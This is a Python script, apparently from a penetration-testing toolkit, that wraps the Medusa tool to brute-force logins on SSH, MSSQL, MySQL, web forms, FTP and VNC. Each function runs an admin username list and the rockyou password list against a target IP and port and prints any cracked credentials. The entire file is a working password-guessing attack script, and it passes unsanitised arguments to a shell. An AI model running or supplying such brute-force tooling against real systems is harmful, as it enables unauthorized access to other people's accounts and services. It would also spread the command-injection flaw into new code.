#!/usr/bin/env python

import subprocess

def sshCrack(ip_address, port):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ssh > discovery/ssh/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.split("\n")
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)

	return

def mssqlCrack(ip_address, port):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mssql > discovery/mssql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.split("\n")
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)

	return

def mysqlCrack(ip_address, port):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mysql  > discovery/mysql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.split("\n")
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)

	return

def webformCrack(ip_address, port):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M web-form  > discovery/http/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.split("\n")
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)

	return

def ftpCrack(ip_address, port):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ftp > discovery/ftp/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.split("\n")
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)

	return

def vncCrack(ip_address, port):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M vnc > discovery/vnc/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.split("\n")
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)

	return